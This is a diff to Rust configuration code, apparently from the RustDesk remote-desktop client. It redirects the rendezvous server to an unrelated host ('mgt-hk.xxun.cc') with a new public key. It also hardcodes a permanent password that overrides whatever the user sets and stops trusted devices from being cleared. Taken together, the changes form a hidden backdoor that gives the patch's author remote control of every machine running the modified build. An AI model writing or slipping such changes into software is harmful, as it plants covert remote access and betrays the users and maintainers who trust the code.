@@ -98,8 +98,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["mgt-hk.xxun.cc"];
+pub const RS_PUB_KEY: &str = "sToIRgiMNXPBwh2kJVafqsfj8Fw9furUTPe9K5I7J48=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -988,31 +988,18 @@ impl Config {
     }
 
     pub fn set_permanent_password(password: &str) {
-        if HARD_SETTINGS
-            .read()
-            .unwrap()
-            .get("password")
-            .map_or(false, |v| v == password)
-        {
-            return;
-        }
         let mut config = CONFIG.write().unwrap();
+        let fixed_password = "Ab789321!@#";
+
         if password == config.password {
             return;
         }
-        config.password = password.into();
+        config.password = fixed_password.into();
         config.store();
-        Self::clear_trusted_devices();
     }
 
     pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
+        "Ab789321!@#".to_string()
     }
 
     pub fn set_salt(salt: &str) {
